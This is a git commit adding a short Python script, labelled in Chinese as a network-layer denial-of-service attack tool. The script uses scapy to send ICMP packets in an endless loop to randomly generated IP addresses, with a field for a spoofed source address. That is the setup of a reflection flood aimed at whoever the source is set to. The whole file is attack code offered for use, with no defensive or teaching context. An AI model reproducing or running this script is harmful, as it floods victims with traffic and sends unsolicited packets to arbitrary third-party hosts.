c7b624d7bd96dd750cc9d724f2529fc7a01b5b62
mandarin1orange <100086932+mandarin1orange@users.noreply.github.com>
2022-03-10 22:53:16 +0800

    Add files via upload
    # 网络层拒绝服务攻击

---
+++ tool-13.py
@@ -0,0 +1,17 @@
+from random import randint
+from scapy.all import *
+import time
+
+def main():
+
+    while 1:
+        pdst = '%i.%i.%i.%i'%(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
+        psrc = ''  # 源地址
+        send(IP(src=psrc,dst=pdst)/ICMP())
+        time.sleep(0.5)
+        print(pdst)
+
+    pass
+
+if __name__ == '__main__':
+    main()
